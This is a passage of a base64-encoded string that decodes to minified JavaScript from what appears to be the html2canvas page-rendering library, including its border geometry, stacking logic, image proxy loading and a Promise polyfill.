Ghpcy5yZW5kZXJRdWV1ZSx0KTp0aGlzLnJlbmRlclF1ZXVlLmxlbmd0aD4wPyh0aGlzLnJlbmRlckluZGV4PTAsdGhpcy5hc3luY1JlbmRlcmVyKHRoaXMucmVuZGVyUXVldWUsdCkpOnQoKToodGhpcy5yZW5kZXJRdWV1ZS5mb3JFYWNoKHRoaXMucGFpbnQsdGhpcyksdCgpKX0sdGhpcykpfSx0aGlzKSl9ZnVuY3Rpb24gcSh0KXtyZXR1cm4gdC5wYXJlbnQmJnQucGFyZW50LmNsaXAubGVuZ3RofWZ1bmN0aW9uIFgodCl7cmV0dXJuIHQucmVwbGFjZSgvKFwtW2Etel0pL2csZnVuY3Rpb24odCl7cmV0dXJuIHQudG9VcHBlckNhc2UoKS5yZXBsYWNlKCItIiwiIil9KX1mdW5jdGlvbiBZKCl7fWZ1bmN0aW9uIEcodCxlLG4scil7cmV0dXJuIHQubWFwKGZ1bmN0aW9uKG8saSl7aWYoby53aWR0aD4wKXt2YXIgYT1lLmxlZnQscz1lLnRvcCxjPWUud2lkdGgsaD1lLmhlaWdodC10WzJdLndpZHRoO3N3aXRjaChpKXtjYXNlIDA6aD10WzBdLndpZHRoLG8uYXJncz1LKHtjMTpbYSxzXSxjMjpbYStjLHNdLGMzOlthK2MtdFsxXS53aWR0aCxzK2hdLGM0OlthK3RbM10ud2lkdGgscytoXX0sclswXSxyWzFdLG4udG9wTGVmdE91dGVyLG4udG9wTGVmdElubmVyLG4udG9wUmlnaHRPdXRlcixuLnRvcFJpZ2h0SW5uZXIpO2JyZWFrO2Nhc2UgMTphPWUubGVmdCtlLndpZHRoLXRbMV0ud2lkdGgsYz10WzFdLndpZHRoLG8uYXJncz1LKHtjMTpbYStjLHNdLGMyOlthK2MscytoK3RbMl0ud2lkdGhdLGMzOlthLHMraF0sYzQ6W2Escyt0WzBdLndpZHRoXX0sclsxXSxyWzJdLG4udG9wUmlnaHRPdXRlcixuLnRvcFJpZ2h0SW5uZXIsbi5ib3R0b21SaWdodE91dGVyLG4uYm90dG9tUmlnaHRJbm5lcik7YnJlYWs7Y2FzZSAyOnM9cytlLmhlaWdodC10WzJdLndpZHRoLGg9dFsyXS53aWR0aCxvLmFyZ3M9Syh7YzE6W2ErYyxzK2hdLGMyOlthLHMraF0sYzM6W2ErdFszXS53aWR0aCxzXSxjNDpbYStjLXRbM10ud2lkdGgsc119LHJbMl0sclszXSxuLmJvdHRvbVJpZ2h0T3V0ZXIsbi5ib3R0b21SaWdodElubmVyLG4uYm90dG9tTGVmdE91dGVyLG4uYm90dG9tTGVmdElubmVyKTticmVhaztjYXNlIDM6Yz10WzNdLndpZHRoLG8uYXJncz1LKHtjMTpbYSxzK2grdFsyXS53aWR0aF0sYzI6W2Esc10sYzM6W2ErYyxzK3RbMF0ud2lkdGhdLGM0OlthK2MscytoXX0sclszXSxyWzBdLG4uYm90dG9tTGVmdE91dGVyLG4uYm90dG9tTGVmdElubmVyLG4udG9wTGVmdE91dGVyLG4udG9wTGVmdElubmVyKX19cmV0dXJuIG99KX1mdW5jdGlvbiBRKHQsZSxuLHIpe3ZhciBvPTQqKChNYXRoLnNxcnQoMiktMSkvMyksaT1uKm8sYT1yKm8scz10K24sYz1lK3I7cmV0dXJue3RvcExlZnQ6Sih7eDp0LHk6Y30se3g6dCx5OmMtYX0se3g6cy1pLHk6ZX0se3g6cyx5OmV9KSx0b3BSaWdodDpKKHt4OnQseTplfSx7eDp0K2kseTplfSx7eDpzLHk6Yy1hfSx7eDpzLHk6Y30pLGJvdHRvbVJpZ2h0Okooe3g6cyx5OmV9LHt4OnMseTplK2F9LHt4OnQraSx5OmN9LHt4OnQseTpjfSksYm90dG9tTGVmdDpKKHt4OnMseTpjfSx7eDpzLWkseTpjfSx7eDp0LHk6ZSthfSx7eDp0LHk6ZX0pfX1mdW5jdGlvbiAkKHQsZSxuKXt2YXIgcj10LmxlZnQsbz10LnRvcCxpPXQud2lkdGgsYT10LmhlaWdodCxzPWVbMF1bMF0sYz1lWzBdWzFdLGg9ZVsxXVswXSxsPWVbMV1bMV0sdT1lWzJdWzBdLGQ9ZVsyXVsxXSxwPWVbM11bMF0sZj1lWzNdWzFdLGc9aS1oLG09YS1kLHk9aS11LHY9YS1mO3JldHVybnt0b3BMZWZ0T3V0ZXI6UShyLG8scyxjKS50b3BMZWZ0LnN1YmRpdmlkZSguNSksdG9wTGVmdElubmVyOlEocituWzNdLndpZHRoLG8rblswXS53aWR0aCxNYXRoLm1heCgwLHMtblszXS53aWR0aCksTWF0aC5tYXgoMCxjLW5bMF0ud2lkdGgpKS50b3BMZWZ0LnN1YmRpdmlkZSguNSksdG9wUmlnaHRPdXRlcjpRKHIrZyxvLGgsbCkudG9wUmlnaHQuc3ViZGl2aWRlKC41KSx0b3BSaWdodElubmVyOlEocitNYXRoLm1pbihnLGkrblszXS53aWR0aCksbytuWzBdLndpZHRoLGc+aStuWzNdLndpZHRoPzA6aC1uWzNdLndpZHRoLGwtblswXS53aWR0aCkudG9wUmlnaHQuc3ViZGl2aWRlKC41KSxib3R0b21SaWdodE91dGVyOlEocit5LG8rbSx1LGQpLmJvdHRvbVJpZ2h0LnN1YmRpdmlkZSguNSksYm90dG9tUmlnaHRJbm5lcjpRKHIrTWF0aC5taW4oeSxpLW5bM10ud2lkdGgpLG8rTWF0aC5taW4obSxhK25bMF0ud2lkdGgpLE1hdGgubWF4KDAsdS1uWzFdLndpZHRoKSxkLW5bMl0ud2lkdGgpLmJvdHRvbVJpZ2h0LnN1YmRpdmlkZSguNSksYm90dG9tTGVmdE91dGVyOlEocixvK3YscCxmKS5ib3R0b21MZWZ0LnN1YmRpdmlkZSguNSksYm90dG9tTGVmdElubmVyOlEocituWzNdLndpZHRoLG8rdixNYXRoLm1heCgwLHAtblszXS53aWR0aCksZi1uWzJdLndpZHRoKS5ib3R0b21MZWZ0LnN1YmRpdmlkZSguNSl9fWZ1bmN0aW9uIEoodCxlLG4scil7dmFyIG89ZnVuY3Rpb24odCxlLG4pe3JldHVybnt4OnQueCsoZS54LXQueCkqbix5OnQueSsoZS55LXQueSkqbn19O3JldHVybntzdGFydDp0LHN0YXJ0Q29udHJvbDplLGVuZENvbnRyb2w6bixlbmQ6cixzdWJkaXZpZGU6ZnVuY3Rpb24oaSl7dmFyIGE9byh0LGUsaSkscz1vKGUsbixpKSxjPW8obixyLGkpLGg9byhhLHMsaSksbD1vKHMsYyxpKSx1PW8oaCxsLGkpO3JldHVybltKKHQsYSxoLHUpLEoodSxsLGMscildfSxjdXJ2ZVRvOmZ1bmN0aW9uKHQpe3QucHVzaChbImJlemllckN1cnZlIixlLngsZS55LG4ueCxuLnksci54LHIueV0pfSxjdXJ2ZVRvUmV2ZXJzZWQ6ZnVuY3Rpb24ocil7ci5wdXNoKFsiYmV6aWVyQ3VydmUiLG4ueCxuLnksZS54LGUueSx0LngsdC55XSl9fX1mdW5jdGlvbiBLKHQsZSxuLHIsbyxpLGEpe3ZhciBzPVtdO3JldHVybiBlWzBdPjB8fGVbMV0+MD8ocy5wdXNoKFsibGluZSIsclsxXS5zdGFydC54LHJbMV0uc3RhcnQueV0pLHJbMV0uY3VydmVUbyhzKSk6cy5wdXNoKFsibGluZSIsdC5jMVswXSx0LmMxWzFdXSksblswXT4wfHxuWzFdPjA/KHMucHVzaChbImxpbmUiLGlbMF0uc3RhcnQueCxpWzBdLnN0YXJ0LnldKSxpWzBdLmN1cnZlVG8ocykscy5wdXNoKFsibGluZSIsYVswXS5lbmQueCxhWzBdLmVuZC55XSksYVswXS5jdXJ2ZVRvUmV2ZXJzZWQocykpOihzLnB1c2goWyJsaW5lIix0LmMyWzBdLHQuYzJbMV1dKSxzLnB1c2goWyJsaW5lIix0LmMzWzBdLHQuYzNbMV1dKSksZVswXT4wfHxlWzFdPjA/KHMucHVzaChbImxpbmUiLG9bMV0uZW5kLngsb1sxXS5lbmQueV0pLG9bMV0uY3VydmVUb1JldmVyc2VkKHMpKTpzLnB1c2goWyJsaW5lIix0LmM0WzBdLHQuYzRbMV1dKSxzfWZ1bmN0aW9uIFoodCxlLG4scixvLGksYSl7ZVswXT4wfHxlWzFdPjA/KHQucHVzaChbImxpbmUiLHJbMF0uc3RhcnQueCxyWzBdLnN0YXJ0LnldKSxyWzBdLmN1cnZlVG8odCksclsxXS5jdXJ2ZVRvKHQpKTp0LnB1c2goWyJsaW5lIixpLGFdKSwoblswXT4wfHxuWzFdPjApJiZ0LnB1c2goWyJsaW5lIixvWzBdLnN0YXJ0Lngsb1swXS5zdGFydC55XSl9ZnVuY3Rpb24gdGUodCl7cmV0dXJuIHQuY3NzSW50KCJ6SW5kZXgiKTwwfWZ1bmN0aW9uIGVlKHQpe3JldHVybiB0LmNzc0ludCgiekluZGV4Iik+MH1mdW5jdGlvbiBuZSh0KXtyZXR1cm4gMD09PXQuY3NzSW50KCJ6SW5kZXgiKX1mdW5jdGlvbiByZSh0KXtyZXR1cm4tMSE9PVsiaW5saW5lIiwiaW5saW5lLWJsb2NrIiwiaW5saW5lLXRhYmxlIl0uaW5kZXhPZih0LmNzcygiZGlzcGxheSIpKX1mdW5jdGlvbiBvZSh0KXtyZXR1cm4gdCBpbnN0YW5jZW9mIEJlfWZ1bmN0aW9uIGllKHQpe3JldHVybiB0Lm5vZGUuZGF0YS50cmltKCkubGVuZ3RoPjB9ZnVuY3Rpb24gYWUodCl7cmV0dXJuL14obm9ybWFsfG5vbmV8MHB4KSQvLnRlc3QodC5wYXJlbnQuY3NzKCJsZXR0ZXJTcGFjaW5nIikpfWZ1bmN0aW9uIHNlKHQpe3JldHVyblsiVG9wTGVmdCIsIlRvcFJpZ2h0IiwiQm90dG9tUmlnaHQiLCJCb3R0b21MZWZ0Il0ubWFwKGZ1bmN0aW9uKGUpe3ZhciBuPXQuY3NzKCJib3JkZXIiK2UrIlJhZGl1cyIpLHI9bi5zcGxpdCgiICIpO3JldHVybiByLmxlbmd0aD4xfHwoclsxXT1yWzBdKSxyLm1hcCh3ZSl9KX1mdW5jdGlvbiBjZSh0KXtyZXR1cm4gdC5ub2RlVHlwZT09PU5vZGUuVEVYVF9OT0RFfHx0Lm5vZGVUeXBlPT09Tm9kZS5FTEVNRU5UX05PREV9ZnVuY3Rpb24gaGUodCl7dmFyIGU9dC5jc3MoInBvc2l0aW9uIiksbj0tMSE9PVsiYWJzb2x1dGUiLCJyZWxhdGl2ZSIsImZpeGVkIl0uaW5kZXhPZihlKT90LmNzcygiekluZGV4Iik6ImF1dG8iO3JldHVybiJhdXRvIiE9PW59ZnVuY3Rpb24gbGUodCl7cmV0dXJuInN0YXRpYyIhPT10LmNzcygicG9zaXRpb24iKX1mdW5jdGlvbiB1ZSh0KXtyZXR1cm4ibm9uZSIhPT10LmNzcygiZmxvYXQiKX1mdW5jdGlvbiBkZSh0KXtyZXR1cm4tMSE9PVsiaW5saW5lLWJsb2NrIiwiaW5saW5lLXRhYmxlIl0uaW5kZXhPZih0LmNzcygiZGlzcGxheSIpKX1mdW5jdGlvbiBwZSh0KXt2YXIgZT10aGlzO3JldHVybiBmdW5jdGlvbigpe3JldHVybiF0LmFwcGx5KGUsYXJndW1lbnRzKX19ZnVuY3Rpb24gZmUodCl7cmV0dXJuIHQubm9kZS5ub2RlVHlwZT09PU5vZGUuRUxFTUVOVF9OT0RFfWZ1bmN0aW9uIGdlKHQpe3JldHVybiB0LmlzUHNldWRvRWxlbWVudD09PSEwfWZ1bmN0aW9uIG1lKHQpe3JldHVybiB0Lm5vZGUubm9kZVR5cGU9PT1Ob2RlLlRFWFRfTk9ERX1mdW5jdGlvbiB5ZSh0KXtyZXR1cm4gZnVuY3Rpb24oZSxuKXtyZXR1cm4gZS5jc3NJbnQoInpJbmRleCIpK3QuaW5kZXhPZihlKS90Lmxlbmd0aC0obi5jc3NJbnQoInpJbmRleCIpK3QuaW5kZXhPZihuKS90Lmxlbmd0aCl9fWZ1bmN0aW9uIHZlKHQpe3JldHVybiB0LmdldE9wYWNpdHkoKTwxfWZ1bmN0aW9uIGJlKHQsZSl7cmV0dXJuIGZ1bmN0aW9uKCl7cmV0dXJuIHQuYXBwbHkoZSxhcmd1bWVudHMpfX1mdW5jdGlvbiB3ZSh0KXtyZXR1cm4gcGFyc2VJbnQodCwxMCl9ZnVuY3Rpb24geGUodCl7cmV0dXJuIHQud2lkdGh9ZnVuY3Rpb24gRWUodCl7cmV0dXJuIHQubm9kZS5ub2RlVHlwZSE9PU5vZGUuRUxFTUVOVF9OT0RFfHwtMT09PVsiU0NSSVBUIiwiSEVBRCIsIlRJVExFIiwiT0JKRUNUIiwiQlIiLCJPUFRJT04iXS5pbmRleE9mKHQubm9kZS5ub2RlTmFtZSl9ZnVuY3Rpb24gVGUodCl7cmV0dXJuW10uY29uY2F0LmFwcGx5KFtdLHQpfWZ1bmN0aW9uIGtlKHQpe3ZhciBlPXQuc3Vic3RyKDAsMSk7cmV0dXJuIGU9PT10LnN1YnN0cih0Lmxlbmd0aC0xKSYmZS5tYXRjaCgvJ3wiLyk/dC5zdWJzdHIoMSx0Lmxlbmd0aC0yKTp0fWZ1bmN0aW9uIENlKGUpe2Zvcih2YXIgbixyPVtdLG89MCxpPSExO2UubGVuZ3RoOylTZShlW29dKT09PWk/KG49ZS5zcGxpY2UoMCxvKSxuLmxlbmd0aCYmci5wdXNoKHQuaHRtbDJjYW52YXMucHVueWNvZGUudWNzMi5lbmNvZGUobikpLGk9IWksbz0wKTpvKyssbzxlLmxlbmd0aHx8KG49ZS5zcGxpY2UoMCxvKSxuLmxlbmd0aCYmci5wdXNoKHQuaHRtbDJjYW52YXMucHVueWNvZGUudWNzMi5lbmNvZGUobikpKTtyZXR1cm4gcn1mdW5jdGlvbiBTZSh0KXtyZXR1cm4tMSE9PVszMiwxMywxMCw5LDQ1XS5pbmRleE9mKHQpfWZ1bmN0aW9uIEllKHQpe3JldHVybi9bXlx1MDAwMC1cdTAwZmZdLy50ZXN0KHQpfWZ1bmN0aW9uIE9lKHQsZSxuKXtpZighZSlyZXR1cm4gUHJvbWlzZS5yZWplY3QoIk5vIHByb3h5IGNvbmZpZ3VyZWQiKTt2YXIgcj1NZShvbiksbz1QZShlLHQscik7cmV0dXJuIG9uP1VlKG8pOkFlKG4sbyxyKS50aGVuKGZ1bmN0aW9uKHQpe3JldHVybiBqZSh0LmNvbnRlbnQpfSl9ZnVuY3Rpb24gUmUodCxlLG4pe3ZhciByPU1lKGFuKSxvPVBlKGUsdCxyKTtyZXR1cm4gYW4/UHJvbWlzZS5yZXNvbHZlKG8pOkFlKG4sbyxyKS50aGVuKGZ1bmN0aW9uKHQpe3JldHVybiJkYXRhOiIrdC50eXBlKyI7YmFzZTY0LCIrdC5jb250ZW50fSl9ZnVuY3Rpb24gQWUoZSxuLHIpe3JldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihvLGkpe3ZhciBhPWUuY3JlYXRlRWxlbWVudCgic2NyaXB0Iikscz1mdW5jdGlvbigpe2RlbGV0ZSB0Lmh0bWwyY2FudmFzLnByb3h5W3JdLGUuYm9keS5yZW1vdmVDaGlsZChhKX07dC5odG1sMmNhbnZhcy5wcm94eVtyXT1mdW5jdGlvbih0KXtzKCksbyh0KX0sYS5zcmM9bixhLm9uZXJyb3I9ZnVuY3Rpb24odCl7cygpLGkodCl9LGUuYm9keS5hcHBlbmRDaGlsZChhKX0pfWZ1bmN0aW9uIE1lKHQpe3JldHVybiB0PyIiOiJodG1sMmNhbnZhc18iK0RhdGUubm93KCkrIl8iKysrcm4rIl8iK01hdGgucm91bmQoMWU1Kk1hdGgucmFuZG9tKCkpfWZ1bmN0aW9uIFBlKHQsZSxuKXtyZXR1cm4gdCsiP3VybD0iK2VuY29kZVVSSUNvbXBvbmVudChlKSsobi5sZW5ndGg/IiZjYWxsYmFjaz1odG1sMmNhbnZhcy5wcm94eS4iK246IiIpfWZ1bmN0aW9uIExlKHQsbil7dmFyIHI9KGUuY3JlYXRlRWxlbWVudCgic2NyaXB0IiksZS5jcmVhdGVFbGVtZW50KCJhIikpO3IuaHJlZj10LHQ9ci5ocmVmLHRoaXMuc3JjPXQsdGhpcy5pbWFnZT1uZXcgSW1hZ2U7dmFyIG89dGhpczt0aGlzLnByb21pc2U9bmV3IFByb21pc2UoZnVuY3Rpb24ocixpKXtvLmltYWdlLmNyb3NzT3JpZ2luPSJBbm9ueW1vdXMiLG8uaW1hZ2Uub25sb2FkPXIsby5pbWFnZS5vbmVycm9yPWksbmV3IFJlKHQsbixlKS50aGVuKGZ1bmN0aW9uKHQpe28uaW1hZ2Uuc3JjPXR9KVsiY2F0Y2giXShpKX0pfWZ1bmN0aW9uIE5lKHQsZSxuKXtELmNhbGwodGhpcyx0LGUpLHRoaXMuaXNQc2V1ZG9FbGVtZW50PSEwLHRoaXMuYmVmb3JlPSI6YmVmb3JlIj09PW59ZnVuY3Rpb24gRGUodCxlLG4scixvKXt0aGlzLndpZHRoPXQsdGhpcy5oZWlnaHQ9ZSx0aGlzLmltYWdlcz1uLHRoaXMub3B0aW9ucz1yLHRoaXMuZG9jdW1lbnQ9b31mdW5jdGlvbiBCZSh0LGUsbixyKXtELmNhbGwodGhpcyxuLHIpLHRoaXMub3duU3RhY2tpbmc9dCx0aGlzLmNvbnRleHRzPVtdLHRoaXMuY2hpbGRyZW49W10sdGhpcy5vcGFjaXR5PSh0aGlzLnBhcmVudD90aGlzLnBhcmVudC5zdGFjay5vcGFjaXR5OjEpKmV9ZnVuY3Rpb24gX2UodCl7dGhpcy5yYW5nZUJvdW5kcz10aGlzLnRlc3RSYW5nZUJvdW5kcyh0KSx0aGlzLmNvcnM9dGhpcy50ZXN0Q09SUygpLHRoaXMuc3ZnPXRoaXMudGVzdFNWRygpfWZ1bmN0aW9uIEZlKHQpe3RoaXMuc3JjPXQsdGhpcy5pbWFnZT1udWxsO3ZhciBlPXRoaXM7dGhpcy5wcm9taXNlPXRoaXMuaGFzRmFicmljKCkudGhlbihmdW5jdGlvbigpe3JldHVybiBlLmlzSW5saW5lKHQpP1Byb21pc2UucmVzb2x2ZShlLmlubGluZUZvcm1hdHRpbmcodCkpOlVlKHQpfSkudGhlbihmdW5jdGlvbih0KXtyZXR1cm4gbmV3IFByb21pc2UoZnVuY3Rpb24obil7aHRtbDJjYW52YXMuZmFicmljLmxvYWRTVkdGcm9tU3RyaW5nKHQsZS5jcmVhdGVDYW52YXMuY2FsbChlLG4pKX0pfSl9ZnVuY3Rpb24gamUodCl7dmFyIGUsbixyLG8saSxhLHMsYyxoPSJBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvIixsPXQubGVuZ3RoLHU9IiI7Zm9yKGU9MDtsPmU7ZSs9NCluPWguaW5kZXhPZih0W2VdKSxyPWguaW5kZXhPZih0W2UrMV0pLG89aC5pbmRleE9mKHRbZSsyXSksaT1oLmluZGV4T2YodFtlKzNdKSxhPW48PDJ8cj4+NCxzPSgxNSZyKTw8NHxvPj4yLGM9KDMmbyk8PDZ8aSx1Kz02ND09PW8/U3RyaW5nLmZyb21DaGFyQ29kZShhKTo2ND09PWl8fC0xPT09aT9TdHJpbmcuZnJvbUNoYXJDb2RlKGEscyk6U3RyaW5nLmZyb21DaGFyQ29kZShhLHMsYyk7cmV0dXJuIHV9ZnVuY3Rpb24gV2UodCxlKXt0aGlzLnNyYz10LHRoaXMuaW1hZ2U9bnVsbDt2YXIgbj10aGlzO3RoaXMucHJvbWlzZT1lP25ldyBQcm9taXNlKGZ1bmN0aW9uKGUscil7bi5pbWFnZT1uZXcgSW1hZ2Usbi5pbWFnZS5vbmxvYWQ9ZSxuLmltYWdlLm9uZXJyb3I9cixuLmltYWdlLnNyYz0iZGF0YTppbWFnZS9zdmcreG1sLCIrKG5ldyBYTUxTZXJpYWxpemVyKS5zZXJpYWxpemVUb1N0cmluZyh0KSxuLmltYWdlLmNvbXBsZXRlPT09ITAmJmUobi5pbWFnZSl9KTp0aGlzLmhhc0ZhYnJpYygpLnRoZW4oZnVuY3Rpb24oKXtyZXR1cm4gbmV3IFByb21pc2UoZnVuY3Rpb24oZSl7aHRtbDJjYW52YXMuZmFicmljLnBhcnNlU1ZHRG9jdW1lbnQodCxuLmNyZWF0ZUNhbnZhcy5jYWxsKG4sZSkpfSl9KX1mdW5jdGlvbiBIZSh0LGUpe0QuY2FsbCh0aGlzLHQsZSl9ZnVuY3Rpb24gVmUodCxlLG4pe3JldHVybiB0Lmxlbmd0aD4wP2Urbi50b1VwcGVyQ2FzZSgpOml9ZnVuY3Rpb24gemUodCl7QS5hcHBseSh0aGlzLGFyZ3VtZW50cyksdGhpcy50eXBlPSJsaW5lYXIiPT09dC5hcmdzWzBdP3RoaXMuVFlQRVMuTElORUFSOnRoaXMuVFlQRVMuUkFESUFMfWZ1bmN0aW9uIFVlKHQpe3JldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihlLG4pe3ZhciByPW5ldyBYTUxIdHRwUmVxdWVzdDtyLm9wZW4oIkdFVCIsdCksci5vbmxvYWQ9ZnVuY3Rpb24oKXsyMDA9PT1yLnN0YXR1cz9lKHIucmVzcG9uc2VUZXh0KTpuKEVycm9yKHIuc3RhdHVzVGV4dCkpfSxyLm9uZXJyb3I9ZnVuY3Rpb24oKXtuKEVycm9yKCJOZXR3b3JrIEVycm9yIikpfSxyLnNlbmQoKX0pfWZ1bmN0aW9uIHFlKHQsZSl7RGUuYXBwbHkodGhpcyxhcmd1bWVudHMpLHRoaXMuY2FudmFzPXRoaXMub3B0aW9ucy5jYW52YXN8fHRoaXMuZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiY2FudmFzIiksdGhpcy5vcHRpb25zLmNhbnZhc3x8KHRoaXMuY2FudmFzLndpZHRoPXQsdGhpcy5jYW52YXMuaGVpZ2h0PWUpLHRoaXMuY3R4PXRoaXMuY2FudmFzLmdldENvbnRleHQoIjJkIiksdGhpcy50YWludEN0eD10aGlzLmRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImNhbnZhcyIpLmdldENvbnRleHQoIjJkIiksdGhpcy5jdHgudGV4dEJhc2VsaW5lPSJib3R0b20iLHRoaXMudmFyaWFibGVzPXt9LE4oIkluaXRpYWxpemVkIENhbnZhc1JlbmRlcmVyIHdpdGggc2l6ZSIsdCwieCIsZSl9ZnVuY3Rpb24gWGUodCl7cmV0dXJuIHQubGVuZ3RoPjB9aWYoZnVuY3Rpb24oKXtmdW5jdGlvbiBuKHQsZSl7UFtSXT10LFBbUisxXT1lLFIrPTIsMj09PVImJkkoKX1mdW5jdGlvbiBhKHQpe3JldHVybiJmdW5jdGlvbiI9PXR5cGVvZiB0fWZ1bmN0aW9uIHMoKXtyZXR1cm4gZnVuY3Rpb24oKXtwcm9jZXNzLm5leHRUaWNrKHUpfX1mdW5jdGlvbiBjKCl7dmFyIHQ9MCxuPW5ldyBNKHUpLHI9ZS5jcmVhdGVUZXh0Tm9kZSgiIik7cmV0dXJuIG4ub2JzZXJ2ZShyLHtjaGFyYWN0ZXJEYXRhOiEwfSksZnVuY3Rpb24oKXtyLmRhdGE9dD0rK3QlMn19ZnVuY3Rpb24gaCgpe3ZhciB0PW5ldyBNZXNzYWdlQ2hhbm5lbDtyZXR1cm4gdC5wb3J0MS5vbm1lc3NhZ2U9dSxmdW5jdGlvbigpe3QucG9ydDIucG9zdE1lc3NhZ2UoMCl9fWZ1bmN0aW9uIGwoKXtyZXR1cm4gZnVuY3Rpb24oKXtzZXRUaW1lb3V0KHUsMSl9fWZ1bmN0aW9uIHUoKXtmb3IodmFyIHQ9MDtSPnQ7dCs9MilQW3RdKFBbdCsxXSksUFt0XT12b2lkIDAsUFt0KzFdPXZvaWQgMDtSPTB9ZnVuY3Rpb24gZCgpe31mdW5jdGlvbiBwKHQsZSxuLHIpe3RyeXt0LmNhbGwoZSxuLHIpfWNhdGNoKG8pe3JldHVybiBvfX1mdW5jdGlvbiBmKHQsZSxyKXtuKGZ1bmN0aW9uKHQpe3ZhciBuPSExLG89cChyLGUsZnVuY3Rpb24ocil7bnx8KG49ITAsZSE9PXI/bSh0LHIpOnYodCxyKSl9LGZ1bmN0aW9uKGUpe258fChuPSEwLGIodCxlKSl9KTshbiYmbyYmKG49ITAsYih0LG8pKX0sdCl9ZnVuY3Rpb24gZyh0LGUpezE9PT1lLmE/dih0LGUuYik6Mj09PXQuYT9iKHQsZS5iKTp3KGUsdm9pZCAwLGZ1bmN0aW9uKGUpe20odCxlKX0sZnVuY3Rpb24oZSl7Yih0LGUpfSl9ZnVuY3Rpb24gbSh0LGUpe2lmKHQ9PT1lKWIodCxuZXcgVHlwZUVycm9yKCJZb3UgY2Fubm90IHJlc29sdmUgYSBwcm9taXNlIHdpdGggaXRzZWxmIikpO2Vsc2UgaWYoImZ1bmN0aW9uIj09dHlwZW9mIGV8fCJvYmplY3QiPT10eXBlb2YgZSYmbnVsbCE9PWUpaWYoZS5jb25zdHJ1Y3Rvcj09PXQuY29uc3RydWN0b3IpZyh0LGUpO2Vsc2V7dmFyIG47dHJ5e249ZS50aGVufWNhdGNoKHIpe0wuZXJyb3I9cixuPUx9bj09PUw/Yih0LEwuZXJyb3IpOnZvaWQgMD09PW4/dih0LGUpOmEobik/Zih0LGUsbik6dih0LGUpfWVsc2Ugdih0LGUpfWZ1bmN0aW9uIHkodCl7dC5mJiZ0LmYodC5iKSx4KHQpfWZ1bmN0aW9uIHYodCxlKXt2b2lkIDA9PT10LmEmJih0LmI9ZSx0LmE9MSwwIT09dC5lLmxlbmd0aCYmbih4LHQpKX1mdW5jdGlvbiBiKHQsZSl7dm9pZCAwPT09dC5hJiYodC5hPTIsdC5iPWUsbih5LHQpKX1mdW5jdGlvbiB3KHQsZSxyLG8pe3ZhciBpPXQuZSxhPWkubGVuZ3RoO3QuZj1udWxsLGlbYV09ZSxpW2ErMV09cixpW2ErMl09bywwPT09YSYmdC5hJiZuKHgsdCl9ZnVuY3Rpb24geCh0KXt2YXIgZT10LmUsbj10LmE7aWYoMCE9PWUubGVuZ3RoKXtmb3IodmFyIHIsbyxpPXQuYixhPTA7YTxlLmxlbmd0aDthKz0zKXI9ZVthXSxvPWVbYStuXSxyP1QobixyLG8saSk6byhpKTt0LmUubGVuZ3RoPTB9fWZ1bmN0aW9uIEUoKXt0aGlzLmVycm9yPW51bGx9ZnVuY3Rpb24gVCh0LGUsbixyKXt2YXIgbyxzLGMsaCxsPWEobik7aWYobCl7dHJ5e289bihyKX1jYXRjaCh1KXtOLmVycm9yPXUsbz1OfWlmKG89PT1OPyhoPSEwLHM9by5lcnJvcixvPW51bGwpOmM9ITAsZT09PW8pcmV0dXJuIGIoZSxuZXcgVHlwZUVycm9yKCJBIHByb21pc2VzIGNhbGxiYWNrIGNhbm5vdCByZXR1cm4gdGhhdCBzYW1lIHByb21pc2UuIikpLGl9ZWxzZSBvPXIsYz0hMDt2b2lkIDA9PT1lLmEmJihsJiZjP20oZSxvKTpoP2IoZSxzKToxPT09dD92KGUsbyk6Mj09PXQmJmIoZSxvKSl9ZnVuY3Rpb24gayh0LGUpe3RyeXtlKGZ1bmN0aW9uKGUpe20odCxlKX0sZnVuY3Rpb24oZSl7Yih0LGUpfSl9Y2F0Y2gobil7Yih0LG4pfX1mdW5jdGlvbiBDKHQsZSxuLHIpe3RoaXMubj10LHRoaXMuYz1uZXcgdChkLHIpLHRoaXMuaT1uLHRoaXMubyhlKT8odGhpcy5tPWUsdGhpcy5kPXRoaXMubGVuZ3RoPWUubGVuZ3RoLHRoaXMubCgpLDA9PT10aGlzLmxlbmd0aD92KHRoaXMuYyx0aGlzLmIpOih0aGlzLmxlbmd0aD10aGlzLmxlbmd0aHx8MCx0aGlzLmsoKSwwPT09dGhpcy5kJiZ2KHRoaXMuYyx0aGlzLmIpKSk6Yih0aGlzLmMsdGhpcy5wKCkpfWZ1bmN0aW9uIFModCl7aWYoRCsrLHRoaXMuYj10aGlzLmE9dm9pZCAwLHRoaXMuZT1bXSxkIT09dCl7aWYoIWEodCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiWW91IG11c3QgcGFzcyBhIHJlc29sdmVyIGZ1bmN0aW9uIGFzIHRoZSBmaXJzdCBhcmd1bWVudCB0byB0aGUgcHJvbWlzZSBjb25zdHJ1Y3RvciIpO2lmKCEodGhpcyBpbnN0YW5jZW9mIFMpKXRocm93IG5ldyBUeXBlRXJyb3IoIkZhaWxlZCB0byBjb25zdHJ1Y3QgJ1Byb21pc2UnOiBQbGVhc2UgdXNlIHRoZSAnbmV3JyBvcGVyYXRvciwgdGhpcyBvYmplY3QgY29uc3RydWN0b3IgY2Fubm90IGJlIGNhbGxlZCBhcyBhIGZ1bmN0aW9uLiIpO2sodGhpcyx0KX19dmFyIEksTz1BcnJheS5pc0FycmF5P0FycmF5LmlzQXJyYXk6ZnVuY3Rpb24odCl7cmV0dXJuIltvYmplY3QgQXJyYXldIj09PU9iamVjdC5wcm90b3R5cGUudG9TdHJpbmcuY2FsbCh0KX0sUj0wLEE9aSE9PXQ/dDp7fSxNPUEuTXV0YXRpb25PYnNlcnZlcnx8QS5XZWJLaXRNdXRhdGlvbk9ic2VydmVyLEE9InVuZGVmaW5lZCIhPXR5cGVvZiBVaW50OENsYW1wZWRBcnJheSYmInVuZGVmaW5lZCIhPXR5cGVvZiBpbXBvcnRTY3JpcHRzJiYidW5kZWZpbmVkIiE9dHlwZW9mIE1lc3NhZ2VDaGFubmVsLFA9QXJyYXkoMWUzKTtJPSJ1bmRlZmluZWQiIT10eXBlb2YgcHJvY2VzcyYmIltvYmplY3QgcHJvY2Vzc10iP